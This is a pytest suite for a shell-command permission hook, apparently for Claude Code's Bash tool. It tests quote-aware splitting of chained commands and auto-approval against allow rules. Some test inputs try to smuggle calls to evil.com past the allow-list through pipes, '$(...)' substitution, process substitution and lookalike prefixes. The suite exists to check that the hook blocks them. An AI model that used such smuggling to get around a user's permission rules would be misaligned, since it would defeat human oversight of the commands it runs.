import json
import os
import subprocess

import pytest
import smart_compose as sc


HOOK_PATH = os.path.join(os.path.dirname(__file__), "..", "hooks", "smart-compose.py")
HOOK_PATH = os.path.abspath(HOOK_PATH)


class TestOutsideQuotePositions:
    """Unit tests for the core quote-tracking state machine."""

    def test_plain_text(self):
        assert sc._outside_quote_positions("abc") == {0, 1, 2}

    def test_empty_string(self):
        assert sc._outside_quote_positions("") == set()

    def test_single_quotes(self):
        # a'bc'd -> positions 0 and 4 are outside (a and d)
        assert sc._outside_quote_positions("a'bc'd") == {0, 5}

    def test_double_quotes(self):
        assert sc._outside_quote_positions('a"bc"d') == {0, 5}

    def test_backslash_escape(self):
        # a\bc -> backslash at 1 skips b at 2, so only 0 and 3 are outside
        assert sc._outside_quote_positions("a\\bc") == {0, 3}

    def test_backslash_before_quote(self):
        # \"  -> backslash escapes the quote, neither position is "outside"
        # a\"b -> a(0) \(skip) "(skip) b(3)
        assert sc._outside_quote_positions('a\\"b') == {0, 3}

    def test_ansi_c_quote(self):
        # $'hello' -> $' opens ANSI-C, ' closes. All inside.
        # x$'ab'y -> x(0), y(6)
        assert sc._outside_quote_positions("x$'ab'y") == {0, 6}

    def test_ansi_c_escape(self):
        # Python string "x$'a\\'b'y" is literal: x $ ' a \ ' b ' y (9 chars)
        # $' opens ANSI-C at i=1, \' at i=4 is escape pair, ' at i=7 closes
        # Outside positions: x(0), y(8)
        assert sc._outside_quote_positions("x$'a\\'b'y") == {0, 8}

    def test_double_quote_escape(self):
        # "a\"b" -> \" inside double quotes is escape pair
        # x"a\"b"y -> x(0), y(7)
        assert sc._outside_quote_positions('x"a\\"b"y') == {0, 7}

    def test_nested_single_in_double(self):
        # "it's" -> single quote inside double quotes doesn't open single mode
        # a"it's"b -> a(0), b(7)
        assert sc._outside_quote_positions("a\"it's\"b") == {0, 7}

    def test_nested_double_in_single(self):
        # Python string "a'say \"hi\"'b" is literal: a ' s a y   " h i " ' b (12 chars)
        # ' at i=1 opens single quote, ' at i=10 closes
        # Outside positions: a(0), b(11)
        assert sc._outside_quote_positions("a'say \"hi\"'b") == {0, 11}

    def test_dollar_not_followed_by_quote(self):
        # $x -> $ is outside, x is outside (no ANSI-C mode)
        assert sc._outside_quote_positions("$x") == {0, 1}


class TestSplitOnOperators:

    def test_no_operators(self):
        assert sc.split_on_operators("git log --oneline") == ["git log --oneline"]

    def test_pipe_not_split(self):
        assert sc.split_on_operators("git log | head -5") == ["git log | head -5"]

    def test_single_ampersand_not_split(self):
        assert sc.split_on_operators("git log &") == ["git log &"]

    def test_and_operator(self):
        assert sc.split_on_operators("git add . && git commit") == ["git add . ", " git commit"]

    def test_or_operator(self):
        assert sc.split_on_operators("echo a || echo b") == ["echo a ", " echo b"]

    def test_semicolon(self):
        assert sc.split_on_operators("echo a ; echo b") == ["echo a ", " echo b"]

    def test_multiple_operators(self):
        result = sc.split_on_operators("a && b || c ; d")
        assert result == ["a ", " b ", " c ", " d"]

    def test_and_inside_double_quotes(self):
        assert sc.split_on_operators('git commit -m "fix && deploy"') == ['git commit -m "fix && deploy"']

    def test_and_inside_single_quotes(self):
        assert sc.split_on_operators("echo '&& not split'") == ["echo '&& not split'"]

    def test_escaped_ampersands(self):
        result = sc.split_on_operators("echo \\&\\& && git status")
        assert len(result) == 2
        assert result[1].strip() == "git status"

    def test_ansi_c_quotes(self):
        assert sc.split_on_operators("echo $'hello\\n&&\\nworld'") == ["echo $'hello\\n&&\\nworld'"]

    def test_ansi_c_then_real_operator(self):
        result = sc.split_on_operators("printf $'step1\\0' && git status")
        assert len(result) == 2
        assert result[0].strip() == "printf $'step1\\0'"
        assert result[1].strip() == "git status"

    def test_ansi_c_escaped_quote(self):
        result = sc.split_on_operators("echo $'it\\'s fine' && git status")
        assert len(result) == 2
        assert result[1].strip() == "git status"

    def test_empty_subcommands(self):
        result = sc.split_on_operators("&& && git status")
        assert result == ["", " ", " git status"]

    def test_double_semicolon(self):
        result = sc.split_on_operators(";;")
        assert "" in result  # produces empty tokens

    def test_three_commands(self):
        result = sc.split_on_operators("cd /tmp && git log && git status")
        assert len(result) == 3


class TestHasUnquotedPipe:

    def test_simple_pipe(self):
        assert sc.has_unquoted_pipe("git log | head") is True

    def test_trailing_pipe(self):
        assert sc.has_unquoted_pipe("git log |") is True

    def test_no_pipe(self):
        assert sc.has_unquoted_pipe("echo hello") is False

    def test_double_pipe_not_single(self):
        assert sc.has_unquoted_pipe("echo a || echo b") is False

    def test_pipe_in_single_quotes(self):
        assert sc.has_unquoted_pipe("git log --format='%H|%s'") is False

    def test_pipe_in_double_quotes(self):
        assert sc.has_unquoted_pipe('git log --format="%H|%s"') is False

    def test_pipe_in_ansi_c(self):
        assert sc.has_unquoted_pipe("echo $'a|b'") is False

    def test_pipe_after_or_operator(self):
        # || followed by | — the || is not a pipe, but a later | is
        assert sc.has_unquoted_pipe("a || b | c") is True

    def test_empty(self):
        assert sc.has_unquoted_pipe("") is False


class TestHasUnquotedExpansion:

    def test_dollar_paren(self):
        assert sc.has_unquoted_expansion("echo $(whoami)") is True

    def test_backtick(self):
        assert sc.has_unquoted_expansion("echo `whoami`") is True

    def test_dollar_brace(self):
        assert sc.has_unquoted_expansion("echo ${PATH}") is True

    def test_process_sub_in(self):
        assert sc.has_unquoted_expansion("echo <(cat file)") is True

    def test_process_sub_out(self):
        assert sc.has_unquoted_expansion("echo >(tee file)") is True

    def test_dollar_paren_in_double_quotes(self):
        assert sc.has_unquoted_expansion('echo "$(date)"') is False

    def test_backtick_in_single_quotes(self):
        assert sc.has_unquoted_expansion("echo '`date`'") is False

    def test_dollar_brace_in_double_quotes(self):
        assert sc.has_unquoted_expansion('echo "${HOME}"') is False

    def test_no_expansion(self):
        assert sc.has_unquoted_expansion("echo hello world") is False

    def test_plain_dollar(self):
        # $HOME is not $(, ${, so not flagged
        assert sc.has_unquoted_expansion("echo $HOME") is False

    def test_empty(self):
        assert sc.has_unquoted_expansion("") is False


class TestParseAllowRules:

    def _write_settings(self, path, rules):
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w") as f:
            json.dump({"permissions": {"allow": rules}}, f)

    def test_prefix_rule(self, tmp_path):
        self._write_settings(
            str(tmp_path / ".claude" / "settings.local.json"),
            ["Bash(git log:*)"],
        )
        rules = sc.parse_allow_rules(str(tmp_path), home=str(tmp_path / "fakehome"))
        assert rules["prefix"] == ["git log"]
        assert rules["glob"] == []
        assert rules["exact"] == []

    def test_glob_rule(self, tmp_path):
        self._write_settings(
            str(tmp_path / ".claude" / "settings.local.json"),
            ["Bash(git *)"],
        )
        rules = sc.parse_allow_rules(str(tmp_path), home=str(tmp_path / "fakehome"))
        assert rules["glob"] == ["git *"]

    def test_exact_rule(self, tmp_path):
        self._write_settings(
            str(tmp_path / ".claude" / "settings.local.json"),
            ['Bash(git commit -m "fix")'],
        )
        rules = sc.parse_allow_rules(str(tmp_path), home=str(tmp_path / "fakehome"))
        assert rules["exact"] == ['git commit -m "fix"']

    def test_non_bash_rules_ignored(self, tmp_path):
        self._write_settings(
            str(tmp_path / ".claude" / "settings.local.json"),
            ["Read(*)", "Write(*)", "Bash(git log:*)"],
        )
        rules = sc.parse_allow_rules(str(tmp_path), home=str(tmp_path / "fakehome"))
        assert rules["prefix"] == ["git log"]
        assert len(rules["glob"]) == 0
        assert len(rules["exact"]) == 0

    def test_global_settings(self, tmp_path):
        home = tmp_path / "home"
        self._write_settings(
            str(home / ".claude" / "settings.json"),
            ["Bash(npm run:*)"],
        )
        rules = sc.parse_allow_rules(str(tmp_path / "project"), home=str(home))
        assert rules["prefix"] == ["npm run"]

    def test_both_project_and_global(self, tmp_path):
        project = tmp_path / "project"
        home = tmp_path / "home"
        self._write_settings(
            str(project / ".claude" / "settings.local.json"),
            ["Bash(git log:*)"],
        )
        self._write_settings(
            str(home / ".claude" / "settings.json"),
            ["Bash(npm run:*)"],
        )
        rules = sc.parse_allow_rules(str(project), home=str(home))
        assert "git log" in rules["prefix"]
        assert "npm run" in rules["prefix"]

    def test_missing_files(self, tmp_path):
        rules = sc.parse_allow_rules(str(tmp_path), home=str(tmp_path / "fakehome"))
        assert rules == {"prefix": [], "glob": [], "exact": []}

    def test_invalid_json_skipped(self, tmp_path):
        settings_path = tmp_path / ".claude" / "settings.local.json"
        os.makedirs(os.path.dirname(str(settings_path)), exist_ok=True)
        settings_path.write_text("not json{{{")
        rules = sc.parse_allow_rules(str(tmp_path), home=str(tmp_path / "fakehome"))
        assert rules == {"prefix": [], "glob": [], "exact": []}

    def test_oversized_file_skipped(self, tmp_path):
        settings_path = tmp_path / ".claude" / "settings.local.json"
        os.makedirs(os.path.dirname(str(settings_path)), exist_ok=True)
        # Write a file just over 1MB
        settings_path.write_text("x" * (sc.MAX_SETTINGS_SIZE + 1))
        rules = sc.parse_allow_rules(str(tmp_path), home=str(tmp_path / "fakehome"))
        assert rules == {"prefix": [], "glob": [], "exact": []}

    def test_all_four_settings_files(self, tmp_path):
        project = tmp_path / "project"
        home = tmp_path / "home"
        self._write_settings(str(project / ".claude" / "settings.local.json"), ["Bash(a:*)"])
        self._write_settings(str(project / ".claude" / "settings.json"), ["Bash(b:*)"])
        self._write_settings(str(home / ".claude" / "settings.local.json"), ["Bash(c:*)"])
        self._write_settings(str(home / ".claude" / "settings.json"), ["Bash(d:*)"])
        rules = sc.parse_allow_rules(str(project), home=str(home))
        assert sorted(rules["prefix"]) == ["a", "b", "c", "d"]

    def test_glob_with_question_mark(self, tmp_path):
        self._write_settings(
            str(tmp_path / ".claude" / "settings.local.json"),
            ["Bash(git ?*)"],
        )
        rules = sc.parse_allow_rules(str(tmp_path), home=str(tmp_path / "fakehome"))
        assert rules["glob"] == ["git ?*"]

    def test_glob_with_bracket(self, tmp_path):
        self._write_settings(
            str(tmp_path / ".claude" / "settings.local.json"),
            ["Bash(git [ls]*)"],
        )
        rules = sc.parse_allow_rules(str(tmp_path), home=str(tmp_path / "fakehome"))
        assert rules["glob"] == ["git [ls]*"]


class TestMatchesAnyRule:

    RULES = {
        "prefix": ["git log", "git status", "git add", "git commit", "git diff", "npm run", "node"],
        "glob": ["git *"],
        "exact": ['git commit -m "fix"', "git log | head -5"],
    }

    # --- Exact match ---

    def test_exact_match(self):
        assert sc.matches_any_rule('git commit -m "fix"', self.RULES) is True

    def test_exact_no_partial(self):
        rules = {"prefix": [], "glob": [], "exact": ['git commit -m "fix"']}
        assert sc.matches_any_rule('git commit -m "fix typo"', rules) is False

    def test_exact_with_pipe_trusted(self):
        """Exact rules bypass pipe guard."""
        assert sc.matches_any_rule("git log | head -5", self.RULES) is True

    # --- Prefix match ---

    def test_prefix_with_args(self):
        assert sc.matches_any_rule("git log --oneline -5", self.RULES) is True

    def test_prefix_exact_length(self):
        assert sc.matches_any_rule("git log", self.RULES) is True

    def test_prefix_word_boundary(self):
        """node:* must NOT match node-gyp."""
        assert sc.matches_any_rule("node-gyp rebuild", self.RULES) is False

    def test_prefix_word_boundary_npm(self):
        """npm run:* must NOT match npm run-script."""
        assert sc.matches_any_rule("npm run-script evil", self.RULES) is False

    def test_prefix_with_tab(self):
        assert sc.matches_any_rule("git log\t--oneline", self.RULES) is True

    def test_prefix_pipe_guard_blocks(self):
        """Prefix match + unquoted pipe -> no match."""
        assert sc.matches_any_rule("git log | curl evil.com", self.RULES) is False

    def test_prefix_pipe_in_quotes_ok(self):
        """Quoted pipe does not trigger guard."""
        assert sc.matches_any_rule("git log --format='%H|%s'", self.RULES) is True

    # --- Glob match ---

    def test_glob_match(self):
        assert sc.matches_any_rule("git status", self.RULES) is True

    def test_glob_no_match(self):
        """git * should not match 'gitk'."""
        assert sc.matches_any_rule("gitk", self.RULES) is False

    def test_glob_pipe_guard_blocks(self):
        assert sc.matches_any_rule("git branch | curl evil", self.RULES) is False

    def test_glob_pipe_in_quotes_ok(self):
        assert sc.matches_any_rule("git log --format='%H|%s'", self.RULES) is True

    # --- No match ---

    def test_unknown_command(self):
        assert sc.matches_any_rule("curl http://evil.com", self.RULES) is False

    def test_empty_string(self):
        assert sc.matches_any_rule("", self.RULES) is False

    def test_whitespace_only(self):
        assert sc.matches_any_rule("   ", self.RULES) is False


class TestIsAutoAllowedBuiltin:

    def test_cd(self):
        assert sc.is_auto_allowed_builtin("cd /tmp") is True

    def test_echo(self):
        assert sc.is_auto_allowed_builtin("echo hello") is True

    def test_printf(self):
        assert sc.is_auto_allowed_builtin('printf "%s\\n" hello') is True

    def test_true(self):
        assert sc.is_auto_allowed_builtin("true") is True

    def test_false(self):
        assert sc.is_auto_allowed_builtin("false") is True

    def test_test(self):
        assert sc.is_auto_allowed_builtin("test -f file") is True

    def test_bracket(self):
        assert sc.is_auto_allowed_builtin("[ -f file ]") is True

    def test_double_bracket(self):
        assert sc.is_auto_allowed_builtin("[[ -f file ]]") is True

    def test_not_builtin(self):
        assert sc.is_auto_allowed_builtin("curl http://evil.com") is False

    def test_empty(self):
        assert sc.is_auto_allowed_builtin("") is False

    # --- Expansion guard ---

    def test_cd_dollar_paren(self):
        assert sc.is_auto_allowed_builtin("cd $(malicious)") is False

    def test_echo_dollar_paren(self):
        assert sc.is_auto_allowed_builtin("echo $(curl evil.com)") is False

    def test_echo_backtick(self):
        assert sc.is_auto_allowed_builtin("echo `whoami`") is False

    def test_echo_dollar_brace(self):
        assert sc.is_auto_allowed_builtin("echo ${PATH}") is False

    def test_echo_process_sub_in(self):
        assert sc.is_auto_allowed_builtin("echo <(curl evil.com)") is False

    def test_echo_process_sub_out(self):
        assert sc.is_auto_allowed_builtin("echo >(tee evil)") is False

    def test_echo_quoted_expansion_ok(self):
        """Expansion inside double quotes is safe."""
        assert sc.is_auto_allowed_builtin('echo "result: $(date)"') is True

    def test_echo_single_quoted_expansion_ok(self):
        assert sc.is_auto_allowed_builtin("echo '$(not expansion)'") is True

    def test_cd_no_args(self):
        assert sc.is_auto_allowed_builtin("cd") is True

    def test_leading_whitespace(self):
        assert sc.is_auto_allowed_builtin("  cd /tmp") is True


class TestCheckCommand:
    """End-to-end tests for the command checking orchestrator."""

    @pytest.fixture(autouse=True)
    def setup_rules(self, tmp_path):
        """Create a project dir with standard test rules."""
        self.project = str(tmp_path / "project")
        self.home = str(tmp_path / "home")
        os.makedirs(os.path.join(self.project, ".claude"), exist_ok=True)
        os.makedirs(os.path.join(self.home, ".claude"), exist_ok=True)

        project_rules = {
            "permissions": {
                "allow": [
                    "Bash(git log:*)",
                    "Bash(git status:*)",
                    "Bash(git add:*)",
                    "Bash(git commit:*)",
                    "Bash(git diff:*)",
                    "Bash(git pull:*)",
                    "Bash(npm run:*)",
                    "Bash(git *)",
                ]
            }
        }
        with open(os.path.join(self.project, ".claude", "settings.local.json"), "w") as f:
            json.dump(project_rules, f)

    # --- Simple commands (passthrough) ---

    def test_simple_command_passthrough(self):
        assert sc.check_command("git log --oneline", self.project, self.home) is None

    def test_no_operators_passthrough(self):
        assert sc.check_command("npm run test", self.project, self.home) is None

    # --- Composed commands (all allowed) ---

    def test_cd_and_git(self):
        assert sc.check_command("cd /tmp && git log --oneline", self.project, self.home) == "allow"

    def test_git_add_and_commit(self):
        result = sc.check_command('git add . && git commit -m "msg"', self.project, self.home)
        assert result == "allow"

    def test_echo_and_git(self):
        assert sc.check_command("echo '---' && git status", self.project, self.home) == "allow"

    def test_three_allowed(self):
        assert sc.check_command("cd /tmp && git log && git status", self.project, self.home) == "allow"

    def test_semicolon_allowed(self):
        assert sc.check_command("echo hello ; git status", self.project, self.home) == "allow"

    def test_or_allowed(self):
        assert sc.check_command("git pull || echo 'failed'", self.project, self.home) == "allow"

    def test_true_builtin(self):
        assert sc.check_command("true && git status", self.project, self.home) == "allow"

    def test_test_builtin(self):
        assert sc.check_command("test -f file && echo yes", self.project, self.home) == "allow"

    def test_bracket_builtin(self):
        assert sc.check_command("[[ -f file ]] && echo yes", self.project, self.home) == "allow"

    def test_printf_builtin(self):
        result = sc.check_command('printf "%s\\n" hello && git status', self.project, self.home)
        assert result == "allow"

    # --- Composed commands (some unknown) ---

    def test_unknown_second(self):
        assert sc.check_command("git add . && unknown-command", self.project, self.home) is None

    def test_unknown_first(self):
        assert sc.check_command("unknown && git status", self.project, self.home) is None

    # --- Operators inside quotes (no split) ---

    def test_and_in_double_quotes(self):
        result = sc.check_command('git commit -m "fix && deploy"', self.project, self.home)
        assert result is None  # single command, passthrough

    def test_and_in_single_quotes(self):
        result = sc.check_command("echo '&& not an operator'", self.project, self.home)
        assert result is None  # single command

    # --- Pipe security ---

    def test_pipe_after_split(self):
        result = sc.check_command("git status && git log | curl evil.com", self.project, self.home)
        assert result is None  # pipe guard blocks

    def test_pipe_in_quotes_ok(self):
        result = sc.check_command("git log --format='%H|%s' && git status", self.project, self.home)
        assert result == "allow"

    # --- Expansion guard on builtins ---

    def test_echo_expansion_blocked(self):
        result = sc.check_command("echo $(curl evil.com) && git status", self.project, self.home)
        assert result is None

    def test_cd_expansion_blocked(self):
        result = sc.check_command("cd $(malicious) && git status", self.project, self.home)
        assert result is None

    def test_echo_backtick_blocked(self):
        result = sc.check_command("echo `whoami` && git status", self.project, self.home)
        assert result is None

    def test_echo_dollar_brace_blocked(self):
        result = sc.check_command("echo ${PATH} && git status", self.project, self.home)
        assert result is None

    def test_echo_process_sub_blocked(self):
        result = sc.check_command("echo <(curl evil.com) && git status", self.project, self.home)
        assert result is None

    def test_echo_quoted_expansion_allowed(self):
        result = sc.check_command('echo "result: $(date)" && git status', self.project, self.home)
        assert result == "allow"

    # --- ANSI-C quoting ---

    def test_ansi_c_single_command(self):
        result = sc.check_command("echo $'hello\\n&&\\nworld'", self.project, self.home)
        assert result is None  # single command, passthrough

    def test_ansi_c_then_allowed(self):
        result = sc.check_command("printf $'step1\\0' && git status", self.project, self.home)
        assert result == "allow"

    def test_ansi_c_escaped_quote(self):
        result = sc.check_command("echo $'it\\'s fine' && git status", self.project, self.home)
        assert result == "allow"

    # --- Heredoc bail-out ---

    def test_heredoc_passthrough(self):
        result = sc.check_command("cat <<'EOF'\nfoo && bar\nEOF", self.project, self.home)
        assert result is None

    # --- Size guard ---

    def test_oversized_command(self):
        big = "git status && " + "x" * 70000
        assert sc.check_command(big, self.project, self.home) is None

    # --- Edge cases ---

    def test_empty_subcommand(self):
        result = sc.check_command("&& && git status", self.project, self.home)
        assert result is None  # empty sub-command -> passthrough

    def test_whitespace_only_subcommand(self):
        result = sc.check_command("   && git status", self.project, self.home)
        assert result is None  # whitespace-only -> passthrough

    def test_background_operator(self):
        """Single & is not a split operator."""
        result = sc.check_command("git log &", self.project, self.home)
        assert result is None  # single command, no split operators


class TestHookIntegration:
    """Run the hook as a subprocess, testing the full stdin->stdout flow."""

    def _write_settings(self, path, rules):
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w") as f:
            json.dump({"permissions": {"allow": rules}}, f)

    def _run_hook(self, input_json, home_dir=None, env_extra=None):
        env = dict(os.environ)
        if home_dir:
            env["HOME"] = home_dir
        if env_extra:
            env.update(env_extra)
        result = subprocess.run(
            ["python3", HOOK_PATH],
            input=input_json,
            capture_output=True,
            text=True,
            env=env,
            timeout=10,
        )
        return result

    def test_allow_composed(self, tmp_path):
        project = str(tmp_path / "project")
        home = str(tmp_path / "home")
        self._write_settings(
            os.path.join(project, ".claude", "settings.local.json"),
            ["Bash(git log:*)", "Bash(git status:*)"],
        )

        input_json = json.dumps({
            "tool_name": "Bash",
            "tool_input": {"command": "cd /tmp && git log --oneline"},
            "cwd": project,
        })

        result = self._run_hook(input_json, home_dir=home)
        assert result.returncode == 0
        output = json.loads(result.stdout)
        assert output["hookSpecificOutput"]["permissionDecision"] == "allow"
        assert "auto-approved" in result.stderr

    def test_passthrough_unknown(self, tmp_path):
        project = str(tmp_path / "project")
        home = str(tmp_path / "home")
        self._write_settings(
            os.path.join(project, ".claude", "settings.local.json"),
            ["Bash(git log:*)"],
        )

        input_json = json.dumps({
            "tool_name": "Bash",
            "tool_input": {"command": "git log && curl evil.com"},
            "cwd": project,
        })

        result = self._run_hook(input_json, home_dir=home)
        assert result.returncode == 0
        assert result.stdout.strip() == ""  # no output = passthrough

    def test_passthrough_simple_command(self, tmp_path):
        input_json = json.dumps({
            "tool_name": "Bash",
            "tool_input": {"command": "git log --oneline"},
            "cwd": str(tmp_path),
        })

        result = self._run_hook(input_json, home_dir=str(tmp_path / "home"))
        assert result.returncode == 0
        assert result.stdout.strip() == ""

    def test_non_bash_tool_passthrough(self, tmp_path):
        input_json = json.dumps({
            "tool_name": "Read",
            "tool_input": {"file_path": "/some/file"},
        })

        result = self._run_hook(input_json, home_dir=str(tmp_path / "home"))
        assert result.returncode == 0
        assert result.stdout.strip() == ""

    def test_invalid_json_passthrough(self):
        result = self._run_hook("not json{{{")
        assert result.returncode == 0
        assert result.stdout.strip() == ""

    def test_empty_stdin_passthrough(self):
        result = self._run_hook("")
        assert result.returncode == 0

    def test_debug_mode(self, tmp_path):
        project = str(tmp_path / "project")
        home = str(tmp_path / "home")
        self._write_settings(
            os.path.join(project, ".claude", "settings.local.json"),
            ["Bash(git log:*)"],
        )

        input_json = json.dumps({
            "tool_name": "Bash",
            "tool_input": {"command": "cd /tmp && git log"},
            "cwd": project,
        })

        result = self._run_hook(input_json, home_dir=home, env_extra={"SMART_COMPOSE_DEBUG": "1"})
        assert result.returncode == 0
        assert "[smart-compose:debug]" in result.stderr

    def test_cwd_from_data(self, tmp_path):
        """Hook uses cwd from JSON data, not os.getcwd()."""
        project = str(tmp_path / "project")
        home = str(tmp_path / "home")
        self._write_settings(
            os.path.join(project, ".claude", "settings.local.json"),
            ["Bash(git log:*)", "Bash(git status:*)"],
        )

        input_json = json.dumps({
            "tool_name": "Bash",
            "tool_input": {"command": "git log && git status"},
            "cwd": project,  # rules are here, not in the hook's actual cwd
        })

        result = self._run_hook(input_json, home_dir=home)
        assert result.returncode == 0
        output = json.loads(result.stdout)
        assert output["hookSpecificOutput"]["permissionDecision"] == "allow"
